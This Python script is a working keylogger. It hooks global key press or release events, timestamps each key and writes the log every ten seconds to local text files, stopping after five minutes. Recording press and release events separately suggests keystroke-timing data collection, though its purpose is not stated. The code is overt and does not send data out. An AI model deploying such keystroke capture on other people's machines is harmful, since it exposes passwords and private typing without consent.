import keyboard  # for keylogs
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
import time
import sys
from pathlib import Path

SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
INTERRUPT_AFTER = 300 # in seconds, 60 means 1 minute and so on

start_time = time.time()

class Keylogger:

    """
        This script is a keylogger that collects keyboard press events and release events seperately into time-interval-segmented .txt files.
        The reason we record press and realease events seperately is because when running the script, we can only open one listener thread.
        This script should not be run directly, instead run start.bat which will call this script into 2 separate threads.
    """

    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
        """
        name = event.name
        ts = time.time()
        timestamp = datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S %f')
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = "[SPACE]"
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += "{} - {}\n".format(timestamp, name)
        # exit code if timer expired
        if time.time() - start_time > INTERRUPT_AFTER:
            sys.exit()

    def update_filename(self):
        """
            This method constructs the filename to be identified by start & end datetimes
        """
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        Path(f"./logs/{sys.argv[2]}/{sys.argv[1]}").mkdir(parents=True, exist_ok=True)
        self.filename = f"./logs/{sys.argv[2]}/{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
            This method creates a log file in the current directory that contains
            the current keylogs in the `self.log` variable
        """
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        event = sys.argv[1]
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        if event == 'press':
            keyboard.on_press(callback=self.callback)
        if event == 'release':
            keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()